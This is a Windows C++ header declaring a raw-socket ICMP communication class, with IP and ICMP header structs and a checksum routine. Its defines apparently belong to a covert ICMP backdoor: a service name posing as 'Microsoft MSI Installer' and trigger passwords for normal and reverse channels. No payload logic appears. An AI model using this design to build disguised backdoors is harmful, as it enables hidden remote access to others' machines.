#ifndef _ICMP_H_
#define _ICMP_H

#pragma once
#include <winsock2.h>
#include <stdio.h>
#include <conio.h>
#include <stdlib.h>
#pragma comment(lib,"ws2_32.lib")

#define STATUS_FAILED 0xFFFF
#define MAX_PACKET 1024*60
#define xmalloc(s) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (s))
#define xfree(s) HeapFree(GetProcessHeap(), 0, (s))
#define SERVER_NAME "Microsoft MSI Installer"
#define ICMP_PASSWORD 3219 //Edit with the following
#define ICMP_REVERSE_PASSWORD 9123 //Edit with the above

/* The IP header */
typedef struct iphdr {
	unsigned int h_len:4; //4位首部长度
	unsigned int version:4; //IP版本号，4表示IPV4
	unsigned char tos; //8位服务类型TOS
	unsigned short total_len; //16位总长度（字节）
	unsigned short ident; //16位标识
	unsigned short frag_and_flags; //3位标志位
	unsigned char ttl; //8位生存时间 TTL
	unsigned char proto; //8位协议 (TCP, UDP 或其他)
	unsigned short checksum; //16位IP首部校验和
	unsigned int sourceIP; //32位源IP地址
	unsigned int destIP; //32位目的IP地址
}IpHeader;

//定义ICMP首部
typedef struct _ihdr 
{
	BYTE i_type; //8位类型
	BYTE i_code; //8位代码
	USHORT i_cksum; //16位校验和 
	USHORT i_id; //识别号（一般用进程号作为识别号）
	USHORT i_seq; //报文序列号 
	ULONG timestamp; //时间戳
}IcmpHeader;

class ICMP_CONTROL
{
public:
	ICMP_CONTROL();
	~ICMP_CONTROL();
	void SetTimeOut(int type,int timeout);//type:0->SEND, 1->RECV
	int GetTimeOut(int type);//type:0->SEND, 1->RECV
	void socket(const char*ip);
	bool send(const char*buffer,long buflen=0);
	char *recvbuf;bool recv(void);char arg[MAX_PACKET];long argSizeRecv;
	bool OutputString;
private:
	bool recv1(void);
	WSADATA wsaData;
	struct sockaddr_in dest,from;
	int datasize;
	int fromlen;
	char *icmp_data;
	SOCKET sockRaw;
	int recvtimeout,sendtimeout;
	char ipaddress[512];
	inline USHORT checksum(USHORT *buffer, int size)
	{
		unsigned long cksum=0;
		while(size > 1)
		{
			cksum+=*buffer++;
			size-=sizeof(USHORT);
		}
		if(size)
		{
			cksum+=*(UCHAR *)buffer;
		}
		cksum=(cksum >> 16) + (cksum & 0xffff);
		cksum+=(cksum >> 16);
		return(USHORT) (~cksum);
}
};









#endif